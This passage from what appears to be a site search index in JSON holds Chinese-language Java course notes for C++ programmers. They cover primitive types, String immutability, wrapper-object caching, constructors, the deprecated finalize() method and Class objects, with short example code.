\u7a0b\u5e8f\u8bbe\u8ba1","text":""},{"location":"Courses/Java/#java","title":"Java \u7a0b\u5e8f\u8bbe\u8ba1","text":"<p> \u7ea6 28 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u7b14\u8bb0\u5efa\u7acb\u5728\u5df2\u7ecf\u5b66\u4e60\u8fc7 C++ \u7684\u57fa\u7840\u4e0a</p>"},{"location":"Courses/Java/#reference","title":"Reference","text":"<ul> <li>Java Application Design - mem \u7684\u5c0f\u7ad9</li> </ul>"},{"location":"Courses/Java/basic/","title":"Java \u57fa\u7840","text":""},{"location":"Courses/Java/basic/#java","title":"Java \u57fa\u7840","text":"<p> \u7ea6 3926 \u4e2a\u5b57  299 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 23 \u5206\u949f</p>"},{"location":"Courses/Java/basic/#introduction","title":"Introduction","text":"<p>\u73b0\u4ee3\u7684\u7f16\u7a0b\u8bed\u8a00\u51e0\u4e4e\u90fd\u662f C-like \u8bed\u8a00\uff0c\u5728\u8bed\u6cd5\u4e0a\u5dee\u5f02\u8f83\u5c0f\u3002\u8bed\u8a00\u7684\u80fd\u529b/\u9002\u7528\u9886\u57df\u4e3b\u8981\u7531\u5e93\u548c\u4f20\u7edf\u6240\u51b3\u5b9a\uff0c\u800c Java \u9002\u5408\u4e8e\u5f88\u591a\u573a\u5408\uff0c\u4e0d\u4ec5\u4ec5\u662f\u670d\u52a1\u5668\u540e\u7aef\u3002</p> <p>wk \u8001\u5e08\u7684 PPT \u8fd9\u6837\u63a8\u8350\uff1a</p> <ul> <li>\u5bf9\u8ba1\u7b97\u673a\u672c\u8eab\uff08\u4f53\u7cfb\u7ed3\u6784\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u7f16\u8bd1\uff09\u611f\u5174\u8da3 \u2014&gt; C</li> <li>\u60f3\u7f16\u7a0b\u89e3\u51b3\u624b\u5934\u7684\u95ee\u9898\uff08\u7edf\u8ba1\u3001AI\u3001\u684c\u9762\u5c0f\u7a0b\u5e8f\uff09\u2014&gt; Python</li> <li>\u6709\u660e\u786e\u7684\u9700\u6c42\uff08\u6c42\u804c\uff09\u2014&gt; \u4eba\u5bb6\u8981\u4ec0\u4e48\u5b66\u4ec0\u4e48\uff08PHP\u3001JavaScript\u3001C++\uff09</li> <li>\u8fd8\u6ca1\u60f3\u597d \u2014&gt; Java</li> </ul> <p>\u4f01\u4e1a\u4e2d\u7684\u201c\u7cbe\u901aJava\u201d\u901a\u5e38\u6307\u4ee5 Java \u4e3a\u7f16\u7a0b\u8bed\u8a00\u7684\u5168\u5957\u4f53\u7cfb\uff0c\u4f8b\u5982 Spring\u3001Nginx \u7b49</p> <p>Java \u672c\u8eab\u662f\u4e00\u79cd\u7f16\u8bd1\u6267\u884c\u7684\u3001\u9762\u5411\u5bf9\u8c61\u7684\u8bed\u8a00\uff0c\u7f16\u8bd1\u51fa\u6765\u7684\u5b57\u8282\u7801\u901a\u8fc7 JVM \u865a\u62df\u673a\u6267\u884c\uff0c\u5176\u8bde\u751f\u4e8e 1995 \u5e74\u7684 5 \u6708 3 \u65e5\u3002\u4f5c\u4e3a\u4ecb\u7ecd\uff0c\u4e0b\u9762\u7b80\u5355\u5217\u51fa\u51e0\u70b9 Java \u7684\u5173\u952e\u8bbe\u8ba1\u7406\u5ff5\uff1a</p> <ul> <li>\u8de8\u5e73\u53f0\u4e0e\u53ef\u79fb\u690d\u6027<ul> <li>Java \u5ef6\u7eed\u4e86 UNIX \u548c C \u60f3\u5b9e\u73b0\u7684\u201c\u53ef\u79fb\u690d\u201d\u68a6\u60f3\u3002</li> <li>\u901a\u8fc7 JVM\uff08Java \u865a\u62df\u673a\uff09 \u6765\u5b9e\u73b0\u201c\u4e00\u6b21\u7f16\u5199\uff0c\u5230\u5904\u8fd0\u884c\u201d\u3002</li> <li>\u5b57\u8282\u7801\u8bbe\u8ba1\u7b80\u5355\uff0c\u65e2\u53ef\u4ee5\u89e3\u91ca\u6267\u884c\uff08\u4f4e\u6548\uff09\uff0c\u4e5f\u6709 JIT \u7f16\u8bd1\u63d0\u5347\u6027\u80fd\uff08\u9ad8\u6548\uff09\u3002</li> <li>\u652f\u6301\u591a\u7ebf\u7a0b\u5e76\u53d1\u3002</li> </ul> </li> <li>\u7a33\u5b9a\u548c\u7b80\u6d01\uff08KISS \u539f\u5219\uff09<ul> <li>\u81ea\u52a8\u68c0\u67e5\u6570\u7ec4\u4e0b\u6807\uff08\u907f\u514d\u8d8a\u754c\uff09\u3002</li> <li>\u81ea\u52a8\u5185\u5b58\u7ba1\u7406\uff08\u5783\u573e\u56de\u6536 GC\uff09\uff0c\u4e0d\u50cf C \u9700\u8981\u624b\u52a8\u7ba1\u7406\u3002</li> <li>\u98ce\u683c\u63a5\u8fd1 C++\uff0c\u4f46\u53bb\u6389\u4e86\u5f88\u591a\u590d\u6742\u6027\u3002</li> </ul> </li> <li>\u7eaf\u9762\u5411\u5bf9\u8c61<ul> <li>Java \u53ef\u4ee5\u770b\u4f5c \u201cC++ -\u201d\uff0c\u5176\u6ca1\u6709 C++ \u7684\u4e00\u4e9b\u590d\u6742\u7279\u6027<ul> <li>\u6ca1\u6709\u591a\u91cd\u7ee7\u627f Multi-inheritance</li> <li>\u6ca1\u6709\u865a\u62df\u7ee7\u627f Virtual inheritance</li> <li>\u6ca1\u6709\u6a21\u677f Template</li> <li>\u6ca1\u6709\u8fd0\u7b97\u7b26\u91cd\u8f7d Operator overloading</li> </ul> </li> <li>\u4e00\u5207\u90fd\u662f\u7c7b\u548c\u5bf9\u8c61\u3002</li> </ul> </li> <li>\u5bf9\u8c61\u5b58\u50a8\u4e0e\u751f\u547d\u5468\u671f<ul> <li>\u5728 C \u4e2d\uff0c\u5bf9\u8c61\u5b58\u50a8\u65b9\u5f0f\u7531\u7a0b\u5e8f\u5458\u51b3\u5b9a\uff08\u6548\u7387\u4f18\u5148\uff09\u3002</li> <li>\u5728 Java \u4e2d\uff0c\u6240\u6709\u5bf9\u8c61\u90fd\u5728 \u5806\u5185\u5b58 \u4e2d\u6784\u9020\u3002</li> <li>\u7a0b\u5e8f\u5458\u53ea\u80fd\u521b\u5efa\u5bf9\u8c61\uff0c\u9500\u6bc1\u7531 GC \u81ea\u52a8\u5904\u7406\u3002</li> </ul> </li> <li>\u6839\u7c7b Object<ul> <li>\u6240\u6709\u7c7b\u90fd\u76f4\u63a5\u6216\u95f4\u63a5\u7ee7\u627f\u81ea <code>Object</code>\u3002</li> <li>\u56e0\u6b64\u6240\u6709\u4e1c\u897f\u90fd\u662f\u5bf9\u8c61\uff0c\u5bb9\u5668\u5373\u4e3a\u80fd\u591f\u5b58\u653e\u5bf9\u8c61\u7684\u5bf9\u8c61\u3002</li> </ul> </li> </ul> <p>\u6309\u7167\u60ef\u4f8b\uff0c\u4e0b\u9762\u7ed9\u51fa The First Java Program\uff1a</p> <pre><code>public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello World!\");\n    }\n}\n</code></pre>"},{"location":"Courses/Java/basic/#object","title":"Object","text":"<p>\u5728 Java \u4e2d\uff0c\u5bf9\u8c61\u672c\u8eab\u4e00\u5b9a\u5b58\u50a8\u5728\u5806\u5185\u5b58\u4e2d\uff0c\u800c\u6808\u4e2d\u4fdd\u5b58\u7684\u662f\u6307\u5411\u8be5\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u5728\u65b9\u6cd5\u53c2\u6570\u3001\u53d8\u91cf\u3001\u6210\u5458\u5b57\u6bb5\u91cc\u51fa\u73b0\u7684\u6240\u8c13\u201c\u5bf9\u8c61\u201d\uff0c\u5176\u5b9e\u90fd\u662f\u8be5\u5bf9\u8c61\u503c\u7684\u5f15\u7528\uff08\u5728 Java \u4e2d\u79f0\u4e3a\u53e5\u67c4 Handle\uff09\u3002</p> <p>\u53e5\u67c4\u7c7b\u4f3c\u4e8e C/C++ \u7684\u6307\u9488\uff0c\u4f46\u6709\u51e0\u4e2a\u91cd\u8981\u533a\u522b\uff1a</p> <ul> <li>&lt;1&gt; \u4e0d\u80fd\u505a\u6307\u9488\u8fd0\u7b97<ul> <li>Java \u4e2d\u7684\u53e5\u67c4\u5e76\u4e0d\u80fd\u505a <code>p+1</code>, <code>*(p+3)</code> \u7b49\u64cd\u4f5c</li> <li>\u7a0b\u5e8f\u5458\u5e76\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c\u8be5\u5730\u5740</li> </ul> </li> <li>&lt;2&gt; \u53e5\u67c4\u662f\u5b89\u5168\u53d7\u63a7\u7684<ul> <li>JVM \u4f1a\u7ba1\u7406\u53e5\u67c4\uff0c\u786e\u4fdd\u4f60\u4e0d\u4f1a\u8bbf\u95ee\u5230\u975e\u6cd5\u5185\u5b58</li> <li>\u4e00\u65e6\u5bf9\u8c61\u6ca1\u6709\u53e5\u67c4\u6307\u5411\uff0c\u5c31\u4f1a\u4ea4\u7ed9 GC \u6e05\u7406</li> </ul> </li> </ul>"},{"location":"Courses/Java/basic/#primitive-types","title":"Primitive Types","text":"<p>\u5728 Java \u4e2d\uff0c== \u7528\u5728\u57fa\u672c\u7c7b\u578b\u4e2d\u65f6\uff0c\u6bd4\u8f83\u4e8c\u8005\u503c\u662f\u5426\u76f8\u7b49\uff1b\u7528\u5728\u5bf9\u8c61\u5f15\u7528\u4e2d\u65f6\uff0c\u6bd4\u8f83\u662f\u4e0d\u662f\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <p>Java \u4e2d\u7684\u57fa\u672c\u7c7b\u578b\uff08primitive types\uff09\u5171\u6709 8 \u79cd\uff0c\u5b83\u4eec\u5e76\u4e0d\u662f\u5bf9\u8c61\uff0c\u5b83\u4eec\u5728\u6808\u4e0a\u5b58\u653e\u5b83\u4eec\u7684\u503c\u672c\u8eab\uff1a</p> Type Bits Min Value Max Value <code>byte</code> 8 bits -128 127 <code>short</code> 16 bits -32768 32767 <code>int</code> 32 bits -2,147,483,648 2,147,483,647 <code>long</code> 64 bits -9,223,372,036,854,775,808 9,223,372,036,854,775,807 <code>char</code> 16 bits <code>float</code> 32 bits Approximately -3.4E+38 Approximately 3.4E+38 <code>double</code> 64 bits Approximately -1.7E+308 Approximately 1.7E+308 <code>boolean</code> 1 bit or 1 byte <p>\u50cf\u6211\u4eec\u719f\u77e5\u7684 <code>Integer</code>, <code>Double</code>, <code>Boolean</code> \u90fd\u662f\u5305\u88c5\u7c7b\uff0c\u5c5e\u4e8e\u5bf9\u8c61\uff0c\u4e0d\u5c5e\u4e8e\u57fa\u672c\u7c7b\u578b</p> <p>\u50cf <code>2.0</code> \u8fd9\u79cd\u9ed8\u8ba4\u662f double \u578b\u5e38\u91cf\uff0c\u8981\u8d4b\u503c\u7ed9 <code>float</code> \u7c7b\u578b\u53d8\u91cf\uff0c\u5fc5\u987b\u663e\u5f0f\u52a0\u4e0a\u540e\u7f00 <code>2.0f</code></p> <p>Some Special Number Format</p> <pre><code>145_345.23_12 // \u5206\u9694\u7b26 _ \u53ef\u4ee5\u52a0\u5728\u4efb\u610f\u6570\u5b57\u4e4b\u95f4\uff0c\u9664\u4e86\u5f00\u5934/\u7ed3\u5c3e\u6216\u5c0f\u6570\u70b9\u65c1\u8fb9\n0b11001011    // \u524d\u7f00 0b \u6216 0B \u8868\u793a\u4e8c\u8fdb\u5236\u503c\n0123          // \u524d\u7f00 0 \u8868\u793a\u516b\u8fdb\u5236\u503c\n0x7B          // \u524d\u7f00 0x \u6216 0X \u8868\u793a\u5341\u516d\u8fdb\u5236\u503c\n</code></pre> <p>\u4e3a\u4ec0\u4e48 Java \u53ea\u6709 signed\uff0c\u800c\u6ca1\u6709 unsigned\uff1f</p> <p>\u4e3a\u4e86\u7b80\u5316\u8bbe\u8ba1\u3001\u8ffd\u6c42\u8de8\u5e73\u53f0\u79fb\u690d\u6027\u3001\u4ee5\u53ca\u5bf9\u6709\u7b26\u53f7\u7c7b\u578b\u9700\u6c42\u4e0d\u5f3a\u3002</p> <p>Java 8 \u4e4b\u540e\u65b0\u589e\u4e86\u4e00\u4e9b\u65e0\u7b26\u53f7\u8fd0\u7b97\u7684 API\uff0c\u53ef\u4ee5\u628a <code>int</code>/<code>long</code> \u7c7b\u578b\u5f53\u6210\u65e0\u7b26\u53f7\u6570\u6765\u64cd\u4f5c\u3002</p>"},{"location":"Courses/Java/basic/#string","title":"String","text":"<p>String \u672c\u8eab\u662f\u4e00\u4e32 charecters \u7684\u5e8f\u5217\u3002\u5728 Java \u4e2d\uff0c<code>String</code> \u662f\u4e00\u4e2a immutable \u7684 object\uff0c\u8fd9\u610f\u5473\u7740 <code>String</code> \u7684\u5185\u5bb9\u5728\u5176\u521b\u9020\u540e\u662f\u4e0d\u80fd\u6539\u53d8\u7684\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u4e2a\u58f0\u660e\u4e3a <code>String</code> \u7684\u53d8\u91cf\u6307\u5411\u522b\u7684 <code>String</code> \u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a</p> <pre><code>    String s1 = \"hello\";\n    String s2 = \"world\";\n    s1 = s2; // \u6b64\u65f6 s1 \u548c s2 \u90fd\u6307\u5411\u5806\u4e2d\u7684\u5bf9\u8c61 \"world\"\n</code></pre> <p>immutable \u7684\u5b57\u7b26\u4e32\u610f\u5473\u7740\u6211\u4eec\u4fe1\u4efb\u5b57\u7b26\u4e32\u662f\u53ea\u8bfb\u7684\u503c\uff0c\u5728\u5e76\u884c\u8ba1\u7b97\u4e2d\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u52a0\u9501\uff0c\u5929\u7136\u652f\u6301\u591a\u7ebf\u7a0b\u3002</p> <p>C++ \u7684 strings \u662f mutable \u7684\uff0c\u4f46\u662f Python \u7684 strings \u5176\u5b9e\u4e5f\u662f immutable \u7684</p> <p>\u9664\u6b64\u4e4b\u5916\uff0cJava \u7684\u8fd0\u7b97\u65f6\u7531\u5de6\u5411\u53f3\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5bf9\u4e8e\u5982\u4e0b\u8fd0\u7b97\uff0c\u5b83\u4eec\u7684\u8f93\u51fa\u7ed3\u679c\u5bf9\u5e94\u4e3a\uff1a</p> <pre><code>    \"I'm \" + 18;    // \"I'm 18\"\n    1 + 2 + \"age\";  // \"3age\"\n    \"age\" + 1 + 2;  // \"age12\"\n</code></pre> <p>\u4e3a\u4e86\u6bd4\u8f83\u5bf9\u8c61\u7684\u503c\uff0cJava \u7684\u5305\u88c5\u7c7b\u90fd\u5185\u7f6e\u4e86 <code>.equals()</code> \u65b9\u6cd5\uff0c\u6211\u4eec\u5e38\u7528\u7684 equality \u6bd4\u8f83\u90fd\u8981\u4f7f\u7528\u8be5\u65b9\u6cd5\uff1a</p> <pre><code>// test equality\nif(input.equals(\"bye\")) {\n    // ...\n}\n</code></pre> <p>\u5728 Java \u4e2d\uff0c\u9664\u4e86\u4e0d\u53ef\u53d8\u7684 <code>String</code> \u7c7b\u5916\uff0c\u8fd8\u6709\u4e24\u4e2a\u5e38\u7528\u7684\u53ef\u4fee\u6539\u5b57\u7b26\u4e32\u7c7b\uff1a</p> <pre><code>// \u7ebf\u7a0b\u5b89\u5168\uff0c\u540c\u6b65\uff0c\u6027\u80fd\u7a0d\u6162\uff0c\u9002\u7528\u4e8e\u591a\u7ebf\u7a0b\nStringBuffer sb1 = new StringBuffer(\"Hello\");\nsb1.append(\" World\");\n\n// \u7ebf\u7a0b\u4e0d\u5b89\u5168\uff0c\u4e0d\u540c\u6b65\uff0c\u6027\u80fd\u66f4\u5feb\uff0c\u9002\u7528\u4e8e\u5355\u7ebf\u7a0b\nStringBuilder sb2 = new StringBuilder(\"Hello\");\nsb2.append(\" World\");\n</code></pre> <p>\u5047\u5b9a\u6211\u4eec\u6709\u5982\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>String s = \"\";\nfor (int i = 0; i &lt; 100; i++ )\n    s += i; // s = new StringBuilder(s).append(i).toString()\n</code></pre> <p>\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u603b\u5171\u4f1a\u521b\u9020\u51fa 201 \u4e2a\u5bf9\u8c61\uff0c\u5176\u4e2d\u4e00\u8f6e\u5faa\u73af\u4f1a\u521b\u9020\u51fa\u4e00\u4e2a <code>StringBuilder</code> \u548c\u4e00\u4e2a <code>String</code>\u3002\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528 mutable \u7684 <code>StringBuffer</code>\uff1a</p> <pre><code>StringBuffer sb = new StringBuffer();\nfor (int i = 0; i &lt; 100; i++)\n    sb.append(\"\" + i);\nString s = sb.toString();\n</code></pre> <p><code>String</code> \u6709\u4e00\u4e2a\u65b9\u6cd5 <code>String.valueOf()</code>\uff0c\u5b83\u9488\u5bf9\u6240\u6709\u57fa\u672c\u7c7b\u578b\u4ee5\u53ca <code>Object</code> \u90fd\u6709\u91cd\u8f7d\u7248\u672c\uff0c\u6211\u4eec\u5728\u505a\u6570\u636e\u62fc\u63a5\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u8c03\u7528 <code>String.valueOf()</code> \u65b9\u6cd5\u3002</p> <p>\u6240\u6709\u7c7b\u90fd\u7ee7\u627f\u81ea <code>Object</code>\uff0c\u800c <code>Object</code> \u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ed8\u8ba4\u7684 <code>toString()</code> \u65b9\u6cd5\u3002\u9ed8\u8ba4\u7684 <code>toString()</code> \u8f93\u51fa\u662f\u7c7b\u540d+\"@\"+\u54c8\u5e0c\u7801\u3002</p> <p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u81ea\u5b9a\u4e49\u7c7b\u5bf9\u8c61\u6709\u66f4\u597d\u7684\u5b57\u7b26\u4e32\u53ef\u8bfb\u6027\uff0c\u6700\u597d\u5bf9 <code>toString()</code> \u65b9\u6cd5\u8fdb\u884c\u91cd\u5199</p> <p>\u7c7b\u4f3c\u7684\uff0c\u5176\u5b83\u5305\u88c5\u7c7b\uff0c\u5982 <code>Integer</code>, <code>Long</code>, <code>Float</code>, <code>Double</code> \u7b49\u4e5f\u90fd\u6709\u5404\u81ea\u7684 <code>valueOf()</code> \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06 <code>String</code> \u7c7b\u8f6c\u53d8\u4e3a\u5176\u5b83\u7c7b\u578b\u7684\u5bf9\u8c61\uff1a</p> <pre><code>String piStr = \"3.14\";\nFloat pi  = Float.valueOf(piStr);\n</code></pre>"},{"location":"Courses/Java/basic/#_1","title":"\u9884\u751f\u6210\u5bf9\u8c61","text":"<p>\u4e3a\u4e86\u907f\u514d\u9891\u7e41 <code>new</code>\uff0cJVM \u5728\u7c7b\u52a0\u8f7d\u65f6\u4f1a\u63d0\u524d\u521b\u5efa\u3001\u7f13\u5b58\u4e00\u4e9b\u5e38\u7528\u8303\u56f4\u5185\u7684\u5305\u88c5\u7c7b\u5bf9\u8c61\uff0c\u540e\u7eed\u53ef\u4ee5\u76f4\u63a5\u590d\u7528\u5b83\u4eec\uff0c\u8fd9\u88ab\u79f0\u4e3a\u9884\u751f\u6210\u5bf9\u8c61\uff0c\u5b58\u50a8\u5728\u7f13\u5b58\u6c60\u4e2d\u3002</p> <ul> <li>\u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff1a-128 ~ 127</li> <li>\u5bf9\u4e8e\u5b57\u7b26\u7c7b\u578b\uff1a0 ~ 127</li> <li>\u5bf9\u4e8e\u5e03\u5c14\u7c7b\u578b\uff1atrue / false</li> <li>\u5bf9\u4e8e\u6d6e\u70b9\u6570\uff1a\u6ca1\u6709\u9884\u751f\u6210\u5bf9\u8c61</li> </ul> <pre><code>// &gt; jshell\nInteger i1 = 12; // in cache\nInteger i2 = 12;\ni1 == i2; // true\n\ni1 = 1234; // \u8d85\u51fa\u7f13\u5b58\u8303\u56f4\ni2 = 1234;\ni1 == i2; // false\n</code></pre> <p>\u4e0e\u9884\u751f\u6210\u5bf9\u8c61\u6709\u4e9b\u7c7b\u4f3c\uff0cJava \u4f1a\u5bf9 immutable \u7684 <code>String</code> \u7c7b\u578b\u505a\u7f16\u8bd1\u671f\u5e38\u91cf\u4f18\u5316\uff0c\u4e00\u4e9b\u7f16\u8bd1\u671f\u80fd\u786e\u5b9a\u7684 <code>String</code> \u5e38\u91cf\u8868\u8fbe\u5f0f\u4f1a\u88ab\u7f16\u8bd1\u5668\u4f18\u5316\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u6c60\uff08StringPool\uff09\u4e2d\uff1a</p> <pre><code>public class Test {\n    public static void main(String[] args) {\n        String s1 = \"ab\";\n        String s2 = \"abc\";\n        String s3 = s1 + \"c\";   // \u8fd0\u884c\u65f6\u7528 StringBuilder \u751f\u6210\u65b0\u5bf9\u8c61\n        System.out.println(s3 == s2); // false\n        String s4 = \"ab\" + \"c\"; // \u7f16\u8bd1\u5668\u76f4\u63a5\u4f18\u5316\u4e3a \"abc\"\n        System.out.println(s4 == s2); // true\n    }\n}\n</code></pre>"},{"location":"Courses/Java/basic/#class","title":"Class","text":"<p>https://dev.java/learn/inheritance/objects/</p> <p>Java \u4e2d\uff0c\u5c40\u90e8\u53d8\u91cf\u4e0d\u4f1a\u81ea\u52a8\u521d\u59cb\u5316\uff0c\u5fc5\u987b\u5728\u4f7f\u7528\u524d\u663e\u5f0f\u8d4b\u503c\uff1b\u800c\u5bf9\u4e8e\u7c7b\u6210\u5458\u53d8\u91cf\uff0c\u5373\u4fbf\u6ca1\u6709\u663e\u5f0f\u8d4b\u503c\uff0c\u7f16\u8bd1\u5668\u6216 JVM \u90fd\u4f1a\u81ea\u52a8\u521d\u59cb\u5316\uff1a</p> <ul> <li>\u5bf9\u4e8e primitive \u7c7b\u578b\uff0c\u521d\u59cb\u5316\u4e3a 0</li> <li>\u5bf9\u4e8e reference \u7c7b\u578b\uff0c\u521d\u59cb\u5316\u4e3a <code>null</code></li> </ul> <pre><code>class Demo {\n    // \u521d\u59cb\u5316\u987a\u5e8f\u5373\u4e3a\u53d8\u91cf\u5728\u7c7b\u4e2d\u5b9a\u4e49\u7684\u987a\u5e8f\uff0c\u672c\u4f8b\u4e2d\u4e3a x,b,s\n    int x;       // \u6ca1\u8d4b\u503c\uff0c\u81ea\u52a8\u521d\u59cb\u5316\u4e3a 0\n    boolean b;   // \u81ea\u52a8\u521d\u59cb\u5316\u4e3a false\n    String s;    // \u81ea\u52a8\u521d\u59cb\u5316\u4e3a null\n}\n</code></pre> <p>\u4e0d\u540c\u4e8e C\uff0cJava \u7684\u7c7b\u540e\u4e0d\u7528\u518d\u52a0\u5206\u53f7 <code>;</code></p> <p>\u5728 Java \u4e2d\uff0c\u5982\u679c\u4f60\u5e0c\u671b\u5728\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4e2d\u8c03\u7528\u672c\u7c7b\u7684\u53e6\u4e00\u4e2a\u6784\u9020\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>this(...)</code> \u5b8c\u6210\uff0c\u8fd9\u79cd\u7528\u6cd5\u79f0\u4e3a\u6784\u9020\u5668\u59d4\u6258(delegating constructor)\uff0c\u4e14\u5fc5\u987b\u5199\u5728\u6784\u9020\u65b9\u6cd5\u7684\u7b2c\u4e00\u884c\uff1a</p> <pre><code>class Flower {\n    int petals;\n    String name;\n\n    Flower(int petals) {\n        this(petals, \"NoName\"); // \u8c03\u7528\u53e6\u4e00\u4e2a\u6784\u9020\u51fd\u6570\n    }\n\n    Flower(int petals, String name) {\n        this.petals = petals;\n        this.name = name;\n    }\n}\n</code></pre> <p>\u5728\u5bf9\u8c61\u88ab GC \u56de\u6536\u4e4b\u524d\uff0cJVM \u4f1a\u8c03\u7528\u5bf9\u8c61\u7684 <code>finalize()</code> \u65b9\u6cd5\u3002\u8bbe\u8ba1\u4e0a\u5b83\u4e0e C++ \u4e2d\u7684\u6790\u6784\u51fd\u6570(destructor)\u6709\u4e9b\u7c7b\u4f3c\uff0c\u4f46\u5176\u5b9e\u5b8c\u5168\u4e0d\u540c\u3002</p> <p>\u5728 C++ \u4e2d\uff0c\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\u662f\u53ef\u63a7\u7684\uff0c\u5728\u79bb\u5f00\u4f5c\u7528\u57df\u65f6\u9a6c\u4e0a\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0c\u4fdd\u8bc1\u8d44\u6e90\u7684\u91ca\u653e\uff1b\u800c\u5bf9\u4e8e Java\uff0c\u5185\u5b58\u91ca\u653e\u65f6\u673a\u7531 GC \u51b3\u5b9a\uff0c\u4f60\u4e0d\u77e5\u9053\u5bf9\u8c61\u4ec0\u4e48\u65f6\u5019\u88ab\u56de\u6536\uff0c\u751a\u81f3\u6709\u53ef\u80fd\u4e0d\u4f1a\u88ab\u56de\u6536\u3002</p> <p>\u5e76\u4e14 GC \u53ea\u8d1f\u8d23\u56de\u6536\u5185\u5b58\uff0c\u5b83\u5e76\u4e0d\u7b49\u540c\u4e8e\u9500\u6bc1\u5bf9\u8c61\uff0c\u6240\u4ee5\u4e0d\u80fd\u4f9d\u8d56 <code>finalize()</code> \u6765\u505a\u4e00\u4e9b\u5173\u952e\u7684\u6e05\u7406\u5de5\u4f5c\uff0c\u6bd4\u5982\u5173\u95ed\u6587\u4ef6\u3001\u91ca\u653e\u7f51\u7edc\u8fde\u63a5\u7b49\u3002</p> <code>finalize()</code> \u65b9\u6cd5\u5df2\u7ecf\u88ab\u6807\u8bb0\u4e3a Deprecated <p>Finalization is deprecated and subject to removal in a future release. The use of finalization can lead to problems with security, performance, and reliability. See\u00a0JEP 421\u00a0for discussion and alternatives.</p> <p>Subclasses that override\u00a0<code>finalize</code>\u00a0to perform cleanup should use alternative cleanup mechanisms and remove the\u00a0<code>finalize</code>\u00a0method. Use\u00a0<code>Cleaner</code>\u00a0and\u00a0<code>PhantomReference</code>\u00a0as safer ways to release resources when an object becomes unreachable. Alternatively, add a\u00a0<code>close</code>\u00a0method to explicitly release resources, and implement\u00a0<code>AutoCloseable</code>\u00a0to enable use of the\u00a0<code>try</code>-with-resources statement.</p> <p>This method will remain in place until finalizers have been removed from most existing code.</p> <p>Java \u7684 Static Member \u548c C++ \u6ca1\u4ec0\u4e48\u592a\u5927\u7684\u533a\u522b\uff0c\u5305\u62ec\u9759\u6001\u65b9\u6cd5\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5b9e\u4f8b\u7684\u6210\u5458\uff08\u56e0\u4e3a\u6ca1\u6709 <code>this</code>\uff09\u3002\u9664\u6b64\u4e4b\u5916\uff0cJava \u8fd8\u6709\u4e00\u79cd\u9759\u6001\u4ee3\u7801\u5757\uff0c\u53ef\u4ee5\u7528\u6765\u505a\u4e00\u4e9b\u9759\u6001\u53d8\u91cf\u7684\u521d\u59cb\u5316\u6216\u51c6\u5907\u5de5\u4f5c\uff0c\u8fd9\u4f1a\u5728\u7c7b\u7b2c\u4e00\u6b21\u52a0\u8f7d\u65f6\u6267\u884c\uff1a</p> <pre><code>class InitDemo {\n    static int x;\n    static {\n        // \u7c7b\u52a0\u8f7d\u65f6\u6267\u884c\n        x = 42;\n        System.out.println(\"\u9759\u6001\u4ee3\u7801\u5757\u6267\u884c\");\n    }\n}\n</code></pre> <p>\u5728 Java \u91cc\uff0c<code>Class</code> \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08\u5143\u5bf9\u8c61\uff09\uff0c\u7531 <code>java.lang.Class</code> \u8868\u793a\u3002\u6211\u4eec\u5199\u7684\u6bcf\u4e00\u4e2a\u7c7b\u90fd\u4f1a\u5728\u7f16\u8bd1\u65f6\u751f\u6210\u4e00\u4e2a <code>.class</code> \u6587\u4ef6\uff0c\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0cJVM \u4f1a\u628a\u8fd9\u4e2a <code>.class</code> \u6587\u4ef6\u52a0\u8f7d\u8fdb\u6765\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u5bf9\u5e94\u7684 <code>Class</code> \u5bf9\u8c61\u3002</p> <p>\u4e00\u4e2a <code>.java</code> \u6587\u4ef6\u5185\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\uff0c\u4f46\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u662f <code>public</code>\uff0c\u4e14\u8be5\u7c7b\u540d\u5fc5\u987b\u548c\u6587\u4ef6\u5b8c\u5168\u4e00\u81f4</p> <pre><code>class Demo {}\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        // \u83b7\u53d6 Class \u5bf9\u8c61\u7684\u51e0\u79cd\u65b9\u5f0f\uff1a\n        Class&lt;?&gt; c1 = Demo.class;               // \u7f16\u8bd1\u671f\u65b9\u5f0f\n        Class&lt;?&gt; c2 = Class.forName(\"Demo\");    // \u8fd0\u884c\u671f\u901a\u8fc7\u540d\u5b57\u52a0\u8f7d\n        Demo d = new Demo();\n        Class&lt;?&gt; c3 = d.getClass();             // \u4ece\u5bf9\u8c61\u83b7\u53d6\n\n        System.out.println(c1 == c2); // true\uff0c\u8bf4\u660e\u53ea\u6709\u4e00\u4e2a Class \u5bf9\u8c61\n        System.out.println(c2 == c3); // true\n    }\n}\n</code></pre> <p><code>Class</code> 